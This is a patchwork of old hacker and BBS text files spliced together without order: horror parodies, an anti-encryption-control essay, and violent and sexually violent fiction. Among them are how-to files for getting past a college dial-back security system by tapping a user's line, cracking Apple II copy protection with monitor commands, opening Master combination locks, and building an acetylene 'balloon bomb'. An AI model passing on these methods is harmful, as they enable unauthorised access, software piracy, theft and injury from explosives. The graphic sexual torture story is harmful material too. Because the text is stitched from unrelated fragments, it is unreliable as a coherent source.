was created at the second annual HoHoCon during the night of December 28th through to the next morning in Houston, Texas.

Fourteen major telecom guys contributed to this file which probably makes it a first as a group effort file not written over a network.  It's almost entirely raw and unedited to try and get the spirit of the HoHoCon across with all the spelling mistakes and lack of punctuation intact.

This is it.. I must go.. I may finish later.. I don't know                                                     The Summoning of Demon Seed...  Blackness was all around in the Hilton parking lot... the power was strong and we knew Demon Seed Elite might appear any second from the power of pre puberty crazed glangular overactive k0dez kids... a hush fell over the parking lot and we suddenly felt irritated for some reason    yes we knew that tonite WAS the nite for the coming of Demon Seed Elite.  A herd of K0dez kids wandered by in search of K rad cyber strippers.  In a flash of blue light and clouds of 10 micron dust motes, Demon Seed Elite materialized.  It's blazing CGA monitors flashing with menace, it descended on the nerdlings with fury....  The beams shot forth from the blazing monitors searing the flesh of the huddled masses.  The first casualty was a gangly young codester, twitchintg with the expectations of the looming nudity.  The firey beams struck him at the base of his spine, ripping flesh from bone, sending a shower of blood over the remainaing hacking horde.  The energy expuled from the first kill powered on the energy seeking transformer of Demon Seed.  The k0dez kids cried out in escatsy knowing that cheezy motel porn was no more in their bloodthirst for fat sleezy cybernetic whores.  They had a bigger thing to worry about right now   it is Demon Seed Elite.  As the k rad K00L smoke cleared, Demon Seed Elite appeared...again...  The drolls of the M0D special issue cybernetic cotton gin's drolls permeated the cybernetic battlefield...with dung...cybernetic dung  the dung of the Demon Seed.  The thousands of pixels which made the eye of the Cyberwaste cast its watchful gaze on the terrain some 6,700,000 miles below, methodologically scanning the payphones of the known universe for the brief flash of a KaLl1Ng KaRD!!11!1!  Yet we have not taken the time to discuss the true meaning of Demon Seed, for he has the untmost pirating cabilities... Demon Seed needs no ratio or time limit for everyone knows the k rad warez of the future that sp00geD out of the bed of Demon Seed... for he has the power to travel into the future and get games that have yet to be created in our present time...

Many have noted that the dawning of cheap and effective cryptographic systems could spell the end of the ability of governments to invade people's privacy. Unfortunately, it appears that the government and its cronies have also realized this, and intend to take preemptive action. Our notion of civil rights has decayed so far that it is now considered a citizen's duty to not merely be quiet while he is enslaved but to actively cooperate with his own enslavement. Not merely must we put up with the indignity of the government being granted the right to read our papers and communications to each other, but now it is suggested that we ordinary citizens must personally cooperate to make it easier for them to read our communications.        _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _       ___     ___     ___     ___     ___     ___     ___     ___     ___         x x     x x     x x     x x     x x     x x     x x     x x     x x                                                                                    ' '     ' '     ' '     ' '     ' '     ' '     ' '     ' '     ' '         U       U       U       U       U       U       U       U       U         One passage from the Pledge of Allegiance struck me as a youth as being the true strength of my government.  This passage requires me to protect my country and the Constitution for which it stands from all enemies, both foreign and domestic.      I think those who would give too much power to the government have not said their pledge in a long time.  It says that my country is fully behind the aims of the Constitution and that I as a member of that country have been given the duty to disolve the government by force if reguired when the government becomes an enemy of the people who enacted the Constitution.  Implicit in that duty is the call to those aims without regard to the laws the errant government may have enacted or protections removed.      To those ends my government is not allowed to prevent me from meeting with others who may feel that the government has gone bad.  I am allowed to keep my COMMUNICATIONS private.  In order to defend my country from a bad government as well as other threats I am allowed to keep and bear arms.      To the end of individual protection of the right to privacy, the individual must secure that privacy through any means available.  The government must not prevent the individual from using encryption to secure their right to privacy.      Because my government is an extension of the people of my country, when my government starts protecting itself from those very same people it must have placed the government above the Constitution and the will of the people.  Suggestions like requiring the registration of encryption keys speak to how close some parts of the US government have come to being for itself and not for the people.

From   Sunspot   192  Date   04 08 89 01 24 02 AM  Here's something VERY interesting for everyone in cDc!!  Today I got a phone call  on my board line, I picked it up  from someone who wouldn't identify himself.  He started by saying that I was in major trouble.  I was wondering who it was, and then he finally mentioned cDc and he said that he and the association he's with   ... extremely underground, you will never be able to find us   is against the  sick trash that your group puts out, and it is insulting  or some shit like that.  Then he continued,  We do not like the fact that your members are sympathetic to certain people.   I started going into this long statement about freedom of speech, and then he started threatening everyone.  He said that he could shut us down within 48 hours and that anyone who didn't drop out was in major trouble, including their families.  So I asked, how do you expect to do that   He said they have  very high connections  or something.  He wouldn't tell me who he was, he only said that he has a shell account on DRU and that many people use it often.

Using the computer modum  sic , these unsavory individuals can communicate directly with your child without your knowledge.  Just as importantly, you should be concerned if your child has a friendship with other youth who have access to this equipment in an unsupervised environment.      Using a computer and a modum your child can readily access community  bulletin boards  and receive sexually explicit and graphic material from total strangers who can converse with your children, individuals you quite probably wouldn't even talk with.      The concern becomes more poignant when stated otherwise  would you let a child molester, murderder, convicted criminal into your home to meet alone with your child       According to Fresno Police Detective Frank Clark,  Your child can be in real danger from pedophiles, rapists, satanic cultists and other criminals known to be actively engaged in computer conversation.  Unwittingly, naive children with a natural curiosity can be victimized  emerging healthy sexual feelings of a child can be subverted into a twisted unnatural fetish affecting youth during a vulnerable time in their lives.        It is anticipated that parents, when armed with knowledge this activity exists and awareness that encounters with such deviate individuals results in emotional and psychological damage to their child, will take appropriate measures to eliminate the possibility of strangers interacting with their children via a computer.       A news conference is scheduled for 10 a.m., Thursday, March 19, 1992 at Fresno Police Department, Headquarters.  The conference, presided over by Detective Frank Clark, will be held in the Library located on the second floor.            _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _       ___     ___     ___     ___     ___     ___     ___     ___     ___         x x     x x     x x     x x     x x     x x     x x     x x     x x                                                                                    ' '     ' '     ' '     ' '     ' '     ' '     ' '     ' '     ' '         U       U       U       U       U       U       U       U       U                               Ha.

One of the main points that was stressed over and over in a grueling series of interviews, cross examinations, questionnaires, and photography sessions was the fact that I lost my taste buds from shrapnel back in 'Nam, and have ever since been unable to discern the piquancy of anything I eat.  Texture and the U.S.R.D.A. nutritional information on the sides of cereal boxes is now my single rationale for choosing one entree or side order over another, and for some unknown reason this fact is infinitely engrossing to the swarm of media personnel that pay daily visits to explore my history and background. I'll eat sea squirt, mashed potatoes, and orange jello all in one large bowl, hashed together, to impress upon them my utter and complete lack of taste. Lucky Charms and tequila is a favorite morning snack of mine.  The apparent dangers of this kind of obliviousness are being slipped a mickey in my drink or even getting my steak a bit underdone.  To avoid such pitfalls I bring along my hunchback Porcopio to taste all my dishes before I myself partake.       Porcopio is a brave and noble man, and doubles as my bodyguard whenever Jim's not around with his phalanx of ninjas.  The last time I had any kind of trouble was in an alley behind the movie theater one Tuesday night as the early showing of the most recent Disney movie was just letting out.  A pack of three or four slovenly burgeoning juveniles accosted Jim and I as we were making off with the life size cardboard cutout of Crocodile Dundee from the theater's lobby.  Fortunately the ninjas were on hand as always and in a flash of shuriken, katana, and bare fisted flurry the adolescents were in retreat, nursing their superficial wounds and cursing the ancestors of the silent warriors.

He looks like a good one!  Scott shouted.        Yeah, not scrawny like that last one!  Steve laughed.       Randall stood motionless, paralyzed with fear.  Who were these men and what did they want from him   He glanced at Malcolm and Charlotte who only exchanged confused glances.       Seconds seemed like hours in the silence of the morning air.       Suddenly Scott produced an axe from his backpack and, pointing straight at Randall, said,  We're taking you home with us!  Steve laughed in agreement.       Randall felt the axe tear into his side.  His life blood mixed with the freshly fallen snow and a scream escaped from within his being.       Malcolm and Charlotte gasped in horror at the sight before them.        What was that   Steve asked.        What was what          Must've been my 'magination.        Scott drew the axe back over his shoulder and resumed bludgeoning Randall's body.       Malcolm and Charlotte stood motionless, not sure what to do.  Their lifelong friend was being struck down, just a couple of yards away from them, and they were powerless to help.       The men labored with their grisly mission for several minutes, taking turns with the axe.  Sweat dripped from their foreheads and coated their armpits.  When it was all over, Randall was a pitiful disembodied wreck in the snow.       Scott, now smiling, glanced at Malcolm and Charlotte and wiped Randall's juices from the axe.  This final insult sent a mixture of anger and fear though them.       Steve tied a rope around Randall's body and began to drag him away from the scene.  Scott returned the axe into his backpack and walked a few yards behind Steve.  As if their casual murder wasn't enough, they both began to sing as they disappeared into the distance.       Malcolm and Charlotte began to cry.       Randall slipped in and out of consciousness for the next few weeks.  He was hardy for his size, and though his wounds were mortal, the life blood within him was enough to drag out his final days on earth into the greatest living hell and beyond.       He remembered the wind rushing around him shortly after being subdued. And the sounds of a truck engine running.       He remembered being tortured with a saw.       He remembered being tarred and feathered, in a strange sort of way.  And he was secured in a manner which kept him motionless.       He remembered the countless fires they lit in the weeks that followed. The countless fires that were placed so dangerously close to him that he could feel the heat wanting to consume him   and at that point he would have welcomed it.       He remembered the way the men brought over all their friends who laughed and pointed at him.  They sang mocking songs at him that made him cry.       He remembered the way they finally cleansed him of the tar and feathers.       He remembered being placed in the cold dark street to finally die.  The weeks of torture had finally ended.       And he lay there, in the cold dark morning air.  He felt so dry and lonely.       He thought about his friends back in the forest and for a moment he smiled.                                                                                               I hope you have a new respect for the Randall in                       your living room this holiday year.

I agree that the episode made it seem like it might happen, because it might have happened to someone who was in the same situation as Donna but dealt with it differently than she did. xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx   A uto reply  C ontinue  R e read      C     New Scan  3 Deep in a Hole 50 msgs     xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx  Numb  48 50                            Date  12 24 92  From  Mr. Curious DoPi  32             Subj  ode to an ex girlfriend  I WAS AT WORK, LOOKING THROUGH MY WALLET.

I see so many hip people around here, with that hip, sullen expression, wearing their hip, black, sullen clothes, carrying their oh so hip portfolios around hiply, yet sullen.  Their self induced tension is so thick even I can see it.  I am held in thrall by their powerful sense of self persecution.  I can't look away as they discuss their hip problems amongst their own dark and moody clique.  The clouds of hip tobacco smoke rise from their corner table where they talk about other people's art and make assumptions even though the person who actually poured out his her soul into the canvas could hardly have known it would be such an icon to these hip persons.  I can't help feeling envious of their self induced tension, and their hip black leather shoes with a gloss and a shine unrivalled by the slickest oil spill.  Those art chicks really turn me on with their fluorescent lighted pallor cultivated by many evenings of attending avant garde poetry readings and sullen performance art.  And to think I am so unhip I could never in a million years understand the pain, the TRAUMA, the utter ANGST that these poor, godlike souls have to contend with.  Nay, my simple life is one of pleasure as compared to these martyrs, flagellating themselves so sullenly to keep themselves in enough pain to admire other people's art.  And I am so unhip as to be simply depressed, not quite hip enough to be as sullen as them.  Sullenly yours,      I           Fuck 'em if they can't take a joke.

She pays me my  500,000 and we get to work.    I tie YOUR MOTHER up, naked and spread eagled across two sawhorses with chains. Then I pour STP motor oil across her fat, flaccid butt.  Her pale skin glistening in the dim light of the garage door opener's bulb makes her seem even more diseased and pathetic.   Please, Raheem  her middle aged mouth moans in anticipation.   I had to sell the house and the cars.  I also sold my husband into slavery, he's now in Botswana.  Satisfy me.      Yeah, whatever  I mumble back.  I find a pair of jumper cables under some badminton rackets and open the minivan's hood which is also in the garage. I connect the positive and negative cables to the battery and the other ends to each butt cheek and start the minivan.  YOUR MOTHER is starting to make a buzzing noise as her teeth rattle together  in ecstasy, no doubt .  Then I take the tetherball pole which was leaning against the corner and approach her from behind.   H h how's THIS !  I try to stutter above YOUR MOTHER's electrically  induced noises as I shove several feet of the tetherball pole into her vaginal orifice and far beyond.  Her screams are clearly audible over the purr of the engine.  All of the noise is getting obnoxious, and besides, the closed garage is filling up with carbon monoxide.   Well, s'later!  I say cheerily as I leave the garage into the house, closing the door carefully behind me.  On my way out, I stop by the kitchen and make myself a sandwich and help myself to some Coke.  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx   A uto reply  C ontinue  R e read      C     New Scan  5 Eye Have a Dream! 50 msgs     xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx  Numb  50 50                            Date  12 24 92  From  Swamp Ratte'  102                Subj  Operation Sundevil III  Yow... really scary dream tonight, 'bout people getting killed and stuff like this   I was messing around with my 'puter, calling stuff.  I notice a weird system or whatever and buffer it all and save the buffer.  Later, I call the weird thing some more and do whatever... but I start feeling kinda itchy in my head.  Duh.  Details are really sketchy now, especially from the first part of the dream, so bear, huh....  So I go visit this hacker friend who lives in a great big, mostly empty house. It's kinda Victorian style... the guy's sick and laying in bed.  I ask him how's he doing, and about this computer I found... and he's like,  Damn....it's got me... it's too late... but you're like  this  caught  and he makes a kinda pinching motion with his hand, with his thumb and first finger almost together .  See, that stuff you found, it's a virus, and an AI, but it's more than that...it'll fuck you up, man...it'll fuck you up.   Then he turns his head to look right at me and he's got these crazy eyes, and he's sweating, and he starts doing this insane laugh... like an evil clown or something.  So I'm like,  Uh, yeah... thanks  and split quick.  So for the next few days I'm messing with this stuff I've found... trying to disassemble it, digging through the file with a sector editor, whatever... and I can't really figure it out but there's references to bad stuff... like the Black Death in the medieval period, huge wars, religious slaughters like the Crusades and the Inquisitions and pagan killing...  So there's all this bizarre stuff, right... and my head's buzzing.  It's kinda like an ear ringing thing, but more obnoxious and in the back of my head.  It's getting worse and I don't know what to do 'bout it... so I go to visit the hacker guy again.  He's gotten worse.  He's sweating really bad and barely coherent in his speech, and very weak.  I tell him about the buzzing and what I'd found in the 'puter file, and he mumbles,  I know... all that... but it's got you too now.  and then he does that crazy laughter... but it turns into seizures, and he's gasping and all.  So I rush outta the house to mine, pick up the phone and call '911'...   911, May I help you     Yeah... Phred P00dutz at 1313 Mockingbird Lane is having seizures and needs an ambulance!     crazy laughter...  WE'LL GET HIM AND WE'LL GET YOU AND WE'LL GET ALL THE REST! ... then more of that damn laughter.  The phone starts blaring a really loud carrier tone...  CONNECT!  CONNECT! ... I'm getting hyper wigged and slam down the phone.  My sister's standing there, wondering what's going on... I try to explain that that hacker guy's dying or dead and there's this 'puter deal that has something to do with it.  So we're rushing around trying to decide what to do... and we hear this banging noise outside...like somebody pounding on a board with a hammer.  It's coming from the front, so we rush to the door and pull it open.  There's a wooden sign, about a foot and a half long, hanging from the porch overhang by two chains.  It's swinging slightly, and it has the words  GOT YOU  carved into it and painted nicely, like some sort of twisted Pennsylvania Dutch thing.  We're going  shit...  and my sister goes to get the disk and printouts with the stuff on it, figuring we could just trash 'em or something and it'll go away.  Then there's the banging noise again, out front.  Rush to the door again, and there's another sign hanging below the first, by two chains, swinging slightly and carved.  It says  YOUR PARENTS ARE DEAD   So we go upstairs and there they are, slumped in the corner with their throats bleeding all over the place... the throats are cut almost completely through with a single cut.  Yikes.  So my sister and I rush out the door, delirious and freaked out of our minds... she's carrying the 'puter stuff and we're running out in the front yard to get away... away to anywhere, we don't know.  But there's the banging noise again... bambambambambam... and she's stopping and saying  Look at this...  and the stack of printouts has stuff carved into it, all the way through... and she's reading it,  Whatsdis...'YOU TOO...  and she falls over and starts screaming and gurgling... and I'm trying to hold her up but her throat...it's getting cut through slowly as I stare in blank horror... like a wire was going right through her neck from the front.

And I see that same look in Bucannon's face too, the way his lip trembles when he sees that black press correspondant walk in the room with her skirt split halfway up her thigh....  She with her silk blouse, and her nipples which point in the stiff breeze, the way her breasts bounce ever so slightly when she leans forward to ask a question.  DAMN!

Every Wednesday afternoon, the checkout girl at the grocery store, she tells me,  Have a nice day!

It's horrible!  Please, make it stop!!  Ok, no more.  All those users have something in common.  Do you know what it is    They're all... stupid   Yes, yes, of course.  But they're also DEAD.  I killed them.  Tonight.  Just like I killed more r0dents the night before and the night before that.  I call them to this board so they can make a Final Post.  A lasting testament to their lameosity.  A death certificate.  I'm DemonSeed Elite.   No!  It can't be!  I'd heard the rumors, but I never thought they...you... were real!  I don't understand, why did you call me   NO!  It can't be!  I'm elite!  Right !  I thought I was elite!  Everyone says so!  I'm a warez distributor!  I've got a fast modem and a big hard drive!  You can't possibly want to kill ME!  Sorry, Clarence.  It's true.  You've been running with a bad crowd, those warez d00dez.  I've been watching you, Clarence, and tonight you committed a horrible sin.  Tonight you... this is hard for me to say, I'm getting choked up... RECKLESSLY DELETED T FILES WITH A WILDCARD CHARACTER!  Clarence, how could you  How could you have so little regard for the sanctity of text files   Don't you realize that t files form the only real, legitimate testimony of our telecom culture   The one that WE built ourselves with the roar of our modems and the callouses on our fingertips   No outsider can capture this on... on PAPER! We have text that is beautiful... text that squirms and leaps and trudges across our screens, vibrant and alive!   Oh DemonSeed Elite, forgive me!  I was blinded... BLINDED BY WAREZ!!  Buck up, Clarence.  You have a lot to learn on your path to Enlightened Eliteness.  There's nothing wrong with wares, in moderation.  We must keep in mind always the proper priorities.  Cherish deeply the Phrack's, the Anarchy Inc.'s, and the cDc's of our world  for they know the correct path and will not deceive you.   I will!  I see it now... everything's so clear!  Thank you... you've saved my life!  Spared your life.  I'm giving you another chance, but I'm watching.  I'm always watching.  Log off and go to sleep now, little one.  Tomorrow is a new day.

Phrack Inc.                        Volume One, Issue One, Phile 2 of 8        Hacking SAM   A Description Of The Dial Up Security System                              Written by Spitfire Hacker          SAM is a security system that is being used in many colleges today as a security feature against intrusion from the outside.  This system utilizes a dial back routine which is very effective.  To access the computer, you must first dial the port to which SAM is hooked up.  The port for one such college is located at  818  885  2082.  After you have called, SAM will answer the phone, but will make no other responses  no carrier signals .  At this point, you must punch in a valid Login Identification Number on a push button phone. The number is in this format    xxyyyy    where xx is, for the number mentioned above, 70.  'yyyy' is the last 4 digits of the valid user's telephone number.      If a valid LIN is entered, SAM will give one of 3 responses  1  A 1 second low tone 2  A 1 second alternating high low tone 3  A tone burst  Responses 1 and 2 indicate that SAM has accepted your passcode and is waiting for you to hang up.  After you hang up, it will dial the valid users phone number and wait for a second signal.  Response 3 indicates that all of the outgoing lines are busy.  If SAM accepts your passcode, you will have to tap into the valid users line and intercept SAM when it calls.  If you do this, then hit the ' ' key on your phone.

About 3 or four years ago, a real good friend of mine was teaching a ML Programming course for the Apple 2 series.  I, being a good friend and quite bored, asked him about cracking Apple games.  He told me that he had spent the last summer cracking programs.  He showed me a method that he came up with entirely on his own, boot tracing.  Little did he know that this was already quite popular but he developed his own method for doing it which from reading other files about it, is the simplest I've ever seen.   To give you an idea, I had SN0GGLE  I've never played the game but a friend had it on disk.  completely loaded into memory ready to be dumped in about 12 minutes.  Ok, first of all, ALL programs can be boot traced. The only thing is that some may not be easily converted into files.  The only programs that you should try if you aren't real good at ML, are ones that load completely into memory. Also to do this you will need a cassette recorder.  don't worry the program we will save won't take too long to save, and if all goes well it will only be saved loaded once.  I hate learning the theory behind anything so I'm not gonna give any theory behind this. If you want the theory, read some other phile that does this the hard way.  First make sure your cassette recoder works by BLOADing some program and typing  CALL  151 AA60.AA73 You'll see something that looks like this  AA60 30 02 xx xx xx xx xx xx AA68 xx xx xx xx xx xx xx xx AA70 xx xx 00 08 or whatever...The 30 02 is the length   0230 bytes . The 00 08 is the starting address   0800 .  Oh well, now you need to try and save the program. Type  800.A2FW    A2F  800  230 1  1000 800.A2FM 800 00 N 801 800.A2FM 800.A2FR 1000 800.A2FV  Once you are sure that the cassette works,  by the way do be stupid and try that on a   c!  we can get to the good stuff... First move the ROM boot up code into RAM... all steps will be from the monitor   prompt.  8600 C600.C6FFM 86F9 5C FF  Now load in step 1 of the boot.  8600G C0E8   turn the drive off   Now you have successfully loaded in track 0 sector 0  Now since we won't want to overwrite what we've loaded in this time, Type  8500 800.8FFM 86F9 01 85 8501L Lets see what you've gotten... First see if they move this part into the keyboard buffer.  A lot of programs do this and the boot trace files that I've read don't even deal with this.  LDX 00 LDA 800,X STA 200,X INX BNE  803 JMP  211   or any  2xx   sometimes done with Y's instead of X's.  Then the next part will scramble what's in  08xx. but we don't have to worry about that. Anyways find that JMP  2xx and change it to 4C xx 85 leaving the xx the same. Usually this will be the next address but just to be safe... Ok, now scan the code for any other JMP's if you find one that's direct  indirect ones have the address in parenthesis  change it to 4C 5C FF, but write down the location that it used to jump to first so you know where to look.  It'll probably be 301 or B700. If it's the B700, you got lucky.  If it's the 301 then you've got some more work ahead. If it was an indirect JMP, most likely it was JMP   003E . No if you change that to 4C 5C FF then check 3E from monitor you'll find that 3E is 00 and 3F is 3E...Monitor uses that place in zero page for its current memory location. So what you need to do is 8400 A5 3F 00 20 DA FD A5 3E 20 DA FD 4C 5C FF then change that indirect jump to 85xx 4C 00 84  by the way if the indirect jump is anything other than 3E then most likely you can can just look at it from monitor if not write a little routine like the one above to print out the address hidden.  Oh, check the location after the next run. For now change it to 4C 5C FF.   Anyways this little game will probably go on no longer than 2 or 3 loads, each time just move the newly loaded part to another part of memory and change the jump to jump to monitor  4C 5C FF  and the jump from the part before it to go to the moved code. When you find the part that JMP's up to a high area of memory  usually  B700  you're almost done. The exit routine of the will most likely be the start of the program.  Once you intercept it there, all you have to do now is save it to cassette and re load DOS.  The starting address for saving should be the address that the B700 routine exits through. If this is higher than  6000 then start saving at  2000 to get the Hi Res pictures. Using WXYZ as your starting address type  WXYZ.9CFFW    This will have the main program.  800.WXYZW     Save this are in case there is something needed down here we               don't have to start over from scratch.  Ok now reboot  C600G    with a DOS disk in the drive!  CALL  151 WXYZ.9CFFR Bsave PROGRAM,A WXYZ,L  Whatever 9CFF WXYZ 1 is  If the it gives you an error the file is too big. A quick DOS patch to fix that is  A964 FF and try again. Now that the program is saved, try and run it.  It's a good idea to take the disk out of the drive, there's no telling what the program might try and do if it sees that DOS is loaded in.  WXYZG  If it works, just to make sure that it's a good crack, power down the system and try and BRUN it after a cold boot.  If your saved the pictures with the program, most likely, it won't run. You need to add a JMP at 1FFD to JMP to the main program. Then re BSAVE it with a starting address of A 1FFD, and add 3 to the length.  If the program tries to go to the drive while its running, I'd suggest giving up unless you really understand non DOS disk usage.  but if you did you probably wouldn't be reading this.   If you get a break at an address less than  2000 then you need to load in the second program that you saved to cassette. Put a jump in at  800 to the main program and save the whole damn thing. If it still don't work you're gonna need to really get fancy. Now that you've got the thing running, it's time to figure out what is used and what is just wasted memory. This is where I really can't help you but just make sure that you keep a working copy and before every test power down the machine to clear anything that might be remaining.

The Master lock company has made this kind of lock with a protection scheme. If you pull the handle of it hard, the knob won't turn. That was their biggest mistake...... Ok, now on to it.      1st number.  Get out any of the Master locks so you know what's going on. 1  The handle part  the part that springs open when you get the combination , pull on it, but not enough so that the knob won't move. 2  While pulling on it turn the knob to the left until it won't move any more. Then add 5 to this number. Congradulations, you now have the 1st number.      2nd number.  a lot tougher  Ok, spin the dial around a couple of times, then go to the 1st number you got, then turn it to the right, bypassing the 1st number once. WHEN you have bypassed. Start pulling the handle and turning it. It will eventually fall into the groove and lock. While in the groove pull on it and turn the knob. If it is loose go to the next groove  if it's stiff you got the second number.      3rd number  After getting the 2nd, spin the dial, then enter the 2 numbers, then after the 2nd, go to the right and at all the numbers pull on it. The lock will eventually open if you did it right. If can't do it the first time, be patient, it takes time.   Have phun...                              Gin Fizz 2600 Club!

A great, inflated, green garbage bag slowly wafting down from a tall building. It gains some speed as it nears the ground. People look up and say,  What the....   The garbage bag hits!  BOOM!!!  It explodes in a thundering fireball of green bits of plastic and flame!            What is this   you may ask. Well, this is the great  Acetylene Balloon Bomb.  And here is how to make it.  Ingredients                1        For a small bomb  a plastic bag. Not too big.           For something big ger   a green, plastic garbage bag.   2        Some  Fun Snaps . A dozen should be more than enough.   3        Some garbage bag twisties. String would also do.   4        A few rocks. Not too heavy, but depends on size of           bomb and desired velocity of balloon bomb.   5        PRIME INGREDIENT  Acetylene. This is what is used in           acetylene torches. More on this substance later.   6        One or more eager Anarchists.  NOTES         Acetylene is a fairly dangerous substance. It is unstable upon contact with oxygen  air . For this reason, and for your safety, I recommend you keep all of the acetylene AWAY from any source of oxygen. This means don't let it get in touch with air.   Construction                 1        Fill up a bathtub with cold water. Make it VERY full.  2        Now get put you garbage bag in the water and fill it           with water. Make sure ALL air oxygen is out of the           bag before proceeding.  3        Now take your acetylene source  I used it straight           from the torch, and I recommend this way also. , and           fill the bag up with acetylene.  4        Now, being careful with the acetylene, take the bag           out of the tub and tie the opening shut with the           twisty or string. Let the balloon dry off now.  Put           it in a safe place.   5        Okay. Now that it is dry and filled with acetlene,           open it up and drop a few rocks in there. Also add           some Fun Snaps. The rocks will carry the balloon           down, and the Fun Snaps will spark upon impact, thus           setting off the highly inflammable acetylene.            BABOOM!   6        Now put the twisty or string back on VERY tightly.           You now have a delicate but powerful balloon bomb.  To use          Just drop off of a cliff, airplane, building, or whatever. It will hit the ground a explode in a fireball. Be careful you are not near the explosion site. And be careful you are not directly above the blast or the fireball may rise and give you a few nasty burns.  Have fun! But be careful...

Is it Really Worth it                                               Written by The Nomad, for        all BBS's that wish it.    Note Warning   The author of this file will go detailed into his life.  He                will explain his feelings quite openly. If you are not mature   enought to handle what the author is going to say and wish to insult him for   his beliefs, I suggest you read no further.    Well another typical day in the modem world. Doesn't it just make you want to throwup all over the keyboard  Recently I thought I would call the numbers on the Megaterm 3.0 Famous Systems phone book.  I thought that these would be the  Top of the line  BBS's.  As the Mega  term began to dial with Safehouse I kicked back and watched.  Busy.  Not suprising.  It then proceeded to dial other BBS's, most of which I never have heard of.  After about two more tries the program started to freeze.  Not sure what was going on I picked up the phone only to hear the recording  We're sorry but the number you have dialed has been disconnected or is no longer in service... .  I then hit  U  to unmark the number and continue the Megaterm dialing.  Not too worried that that board was down the Megaterm continued to dail as I again kicked back and watched.  The very next number that was opening message and the prompt for my password or 'NEW'.  Being a new user I typed 'NEW'.  To my displeasement the system told me it was a private BBS that allowed no new users and hung me up. Very displeased I kicked back in my chair and started to listen a little closer to the TV in the other room as the Megaterm began to start dialing again.  After two more welcome busy signals the Megaterm started to flip from 'Click' to 'Busy' and back and forth. Confused, I picked up the phone and again heard that dreadfull recording  Were sorry... .  Very uneasy I pressed  U  to unmark the number.  After a small welcome string of busy signals I got a ring.  The phone was answered and a carrier was sent.  The Megaterm then connected for me only to find that it was a Pixboard.  Very pleased  I love pixboards!  I called back and loaded up Pixterm. Once conne  cted, pleased to see some nice graphics in the opening message I then typed in 'NEW'.  Only to find out that a  10 validation fee was required to access ANYTHING but the main menu and  M ess  age to SysOp.  After messing around for a few minutes I got bored and typed  OFF  to leave the system.  I then returned to Megaterm and it continued to dial.  After another busy signal the numbers sequence started over.  And I got a ring, before I knew it,the words      THE SAFEHOUSE MEGANET   PORT  02      WHERE YOU'RE ALWAYS WELCOME!     were printed across the screen, me being a regular caller to the board entered my name and password only then to be logged off due to the fact the that port was being reserved for a level 5 user. Very discouraged and then realizing that some day, The Safehouse would die too such as others favorate systems like Sherwood Forest II, The Outpost, The World of Cryton, and Sherwood Forest    . I then quitely went to bed.     Extra Note  No offense Safehouse Manager     A day or two later I decided to give a few of the local boards a call, only to find that the most active sub boards around were abuse!  After reading a dozen or so messages I came across a message that was insulting my personal favorite BBS, The Digital Dimension, on line since Aug. 1983, a VERY nice system.  The post was saying how bad the board was because the SysOp wouldn't give him high access, and never answer  ed  F eedback, or  C hats.  I was pretty upset, the SysOp is a personal friend so I naturally  P osted about the matter and explained how he is a very busy person and tries to do as much as he can, after all there are over 750 users!  Feeling satisfied I logged off and observed a few other local boards only to find more abuse, hatred, and destruction.  I then decided I would go outside and get some fresh air and live a nornal life, after all I don't want to take the image of a 'computer freak'.  A day later, very concerned, I again auto dialed to same board with Matthew Dornquast's beloved Megaterm.  After about a half an hour of dialing I heard the computer in the other room signal that a ring was detected.  I came in the room and went through the logon procedures and went staight to the abuse board to find about 10 new mess  gaes after mine! I began to read them  more of the same hatred. I then came to a post about 4 after mine by the person that I posted about.  He told me off and posted my number.  I was very uneasy, I have never heard of the guy before and he posted my number!  Not sure to post or not I sat there for a minute and said why not.  Not bothering to read the other new messages I  P osted.  I then told him how everyone had their own right to say what they want and that posting number solved nothing.  Of course later that week, for about three days I received prank calls, I would pick up the phone with an  Hello   Nothing.  He would just sit there, hoping that I would get upset with his deed.  This will make him happy.  I then started to tell him how much of a man he was by prank calling, he was proba  bly expecting to here  We have a trace on our line blah blah blah!  I then hung up.  He never called back.  Later on that day my very good SysOp friend of The Digital Dimension called me.  He started to explain how he was told earier today that he was going to be moving at the end of this school year.  He then asked me very seriously 'Bryan, will you please run a copy of the board in Houston while I take a copy to Iowa.' I thought long and hard, being a SysOp required alot of work, time, and devotion. A whole lot.  I agreed.  Many things were now needed to be done.  Now relizing that I didn't have the hard  ware to support the system, that week  ened I started a buying spree.  I first bought my Sider 10 Megabyte hard drive,  695. Then bought a Thunderclock, another  110.  I of course needed a firmware chip for my cat,  30.  And so my computer won't overheat, a System Saver,  70.  I then relized that I would need my own phone line so I called the phone company and got it installed,  120.  Relizing how many callers I would loose if the number changed, I would have to pay an additional  60 to get the same number, 713 497 4633 but that will have to wait 'till he moves.  After realizing I just spent over a thousand dollars just to get the board started I began to get use to the software.  It was a home brew.  Nevertheless, a very nice one.  I started to write new  mods  and features for the board.  I only had a print out of the board then so the SysOp could get his software copyright  ed.  Knowing that in order to keep the high quality of the system it would require many long nights over the key  board, more night then ever before.  Typing...  thinking... working...  programming.  After showing the SysOp my progress, he was quite pleased.  I rewrote many functions.  Many features were now more efficient and faster then before.  I also started the begining of our soon to be enormous  L ibrary on our new 'baby' the 10 Meg Sider.    After a month or so, with the same old BBS abuse and programming, I took a look at all the work I had done.  Over 200 files in the  L ibrary so far, many new features which have never appeared on a board in the U.S.   to my known  ledge  have been thought up, organized, and programmed.  I then thought, when I take the board over I will be the victim all this major abuse on these other boards.  What an honor.  God, what an honor!  I then began to wonder, why, why does everyone abuse everyone else so much   Are they insecure  Are they really that upset   Are they just blow  ing off a little steam   Do they enjoy making enemies   Do they feel superior to insult others   I don't know.  I really don't know.  I myself like to make friends.  Not only just friends that I will talk to on the phone, but ones that come over on weekeneds, go out partying on Friday nights, play sports, and just about anything else a true friend does.  Without knowing that I went to the same school as Shadow's Pawn for almost a year I meet him at the SysOps house and am now good friends with him.  Despite the fact that I am two years older then him, he is on the football team, I am in band and enjoy playing the trumpet, and we had almost no common interests became good friends because of similar 